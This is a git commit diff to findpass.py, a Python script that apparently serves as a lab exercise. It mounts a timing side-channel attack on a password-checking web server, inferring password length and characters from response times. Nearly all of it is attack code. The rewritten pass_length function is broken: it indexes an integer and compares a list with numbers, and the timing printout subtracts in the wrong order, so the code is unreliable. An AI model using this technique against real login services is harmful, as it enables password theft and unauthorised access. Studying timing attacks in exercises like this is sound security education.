2060fbe0fab1e9ba5d76e99d67c7c002ca8d645c
nogaklein <71371000+nogaklein@users.noreply.github.com>
2020-11-30 00:11:29 +0200

    Update findpass.py

--- findpass.py
+++ findpass.py
@@ -2,46 +2,48 @@ import requests
 import time
 import math
 
-MAX_LEN = 24
+MAX_LEN = 33
 
 url = r'https://passwordserver.herokuapp.com/'
 started = time.time()
-# POOL = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
-
-
 POOL = 'A1IHiy24U3uV'
 
+CHAR = 0
 
-# POOL = 'Hiy2Uu'
+# מחשבת ממוצע
 def mean(values):
     sum = 0.0
-    for a in values:
-        sum += a
+    for value in values:
+        sum += value
     return sum / len(values)
 
 
+# מחשב סטיית תקן סטנדרטית
 def standard_deviation(values):
     tempSum = 0
     mean1 = mean(values)
-    for a in values:
-        tempSum += math.pow((a - mean1), 2)
+    for value in values:
+        tempSum += math.pow((value - mean1), 2)
     std = math.sqrt(tempSum / len(values))
-    # print('mean:' + str(mean1)+', std:'+str(std))
     return std
 
-
+# מציאת חריגים
 def outliers(samples, threshold):
     mean1 = mean(samples.values())
     std = standard_deviation(samples.values())
     ol = {}
     for item in samples:
         print(f'{item}, {samples[item]}, {mean1}, {std}')
-        if samples[item] > (mean1 + std * threshold):
-            ol[item] = samples[item]
+        if CHAR == 2:
+            if samples[item] < (mean1 - std * threshold):
+                ol[item] = samples[item]
+        else:
+            if samples[item] > (mean1 + std * threshold):
+                ol[item] = samples[item]
     return ol
 
 
-# check 'repeat' times the duration for request/response to spcific url (url2check)
+# check 'repeat' times the duration for request/response to specific url (url2check)
 # return array with measured duration of requestqresponse to url
 def timeit(url2check, repeat=1):
     tt = []
@@ -56,27 +58,20 @@ def timeit(url2check, repeat=1):
 # find the password length
 # logic: search for average highest duration
 # assumption: duration for the correct length is higher than for length for incorrect length
-def find_pass_len(pswd_start_len=1):
-    count = 0
-    checks = []
-    check_len = pswd_start_len
-    while check_len < MAX_LEN:
-        url1 = url + '/' + ("").ljust(check_len, '_')
-        checks.append(min(timeit(url1, 10)))
-        if checks[-1] > min(checks) + 0.09:
-            print(checks[-1])
-            count += 1
-            if count > 1:
-                print(count)
-                raise Exception("network error pls try again")
-        print(f'Checking password length {check_len}: min time {checks[-1]}')
-        check_len += 1
-    idx = checks.index(max(checks))
-    idx += pswd_start_len
-    print(f"Password length found: {idx}")
-    return idx
+def pass_length(passStartLength=1):
+    check_length = passStartLength
+    found = False
+    url1 = url + '/' + "".ljust(check_length, '_')
+    standart = standard_deviation(timeit(url1, 10)) + timeit(url1, 1)
+    while not found:
+        print(f'checking password length {check_length}: min time {check_length[-1]}')
+        check_length += 1
+        url1 = url + '/' + "".ljust(check_length, '_')
+        if timeit(url1, 10) > standart:
+            found = True
+    return check_length
 
-
+# מציאת הסיסמה על פי אורכה
 def find_password(length):
     passw = ""
     goodDict = {}
@@ -86,7 +81,7 @@ def find_password(length):
         for i in range(len(POOL)):
             url1 = url + '/' + (passw + POOL[i] + "_" * (length - 1 - j))
             print(f'checking for: {url1}')
-            checks.append(min(timeit(url1, 5)))
+            checks.append(min(timeit(url1, 2)))
             print(f'min time {checks[-1]}')
             goodDict[POOL[i]] = checks[-1]
         goodDict = outliers(goodDict, 0.2)
@@ -95,9 +90,12 @@ def find_password(length):
         else:
             passw += min(goodDict.keys(), key=(lambda k: goodDict[k]))
         print(passw)
+
+        global CHAR
+        CHAR += 1
     return passw
 
-
+# מציאת התו האחרון בסיסמה
 def find_pass_last_char(passw):
     for i in POOL:
         url1 = url + '/' + (passw + i)
@@ -111,3 +109,6 @@ def find_pass_last_char(passw):
 print(find_pass_last_char(find_password(4)))
 ended = time.time()
 print("time" + str(started - ended))
+
+
+
